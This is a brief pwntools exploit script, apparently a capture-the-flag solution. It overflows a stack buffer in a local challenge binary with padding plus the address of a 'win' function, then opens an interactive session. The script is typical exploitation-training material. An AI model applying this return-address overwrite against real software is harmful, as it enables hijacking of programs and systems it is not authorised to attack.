#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./out')
context.terminal = 'kitty -e sh -c'.split()

def conn():
    if args.REMOTE:
        return remote('0.0.0.0', 8080)
    else:
        return process([elf.path])
    

r = conn()

pay = b'A' * 0x28
pay += p64(elf.sym.win)

print(f'Payload: {pay}')

# gdb.attach(r)
r.sendlineafter(b'>', pay)


r.interactive()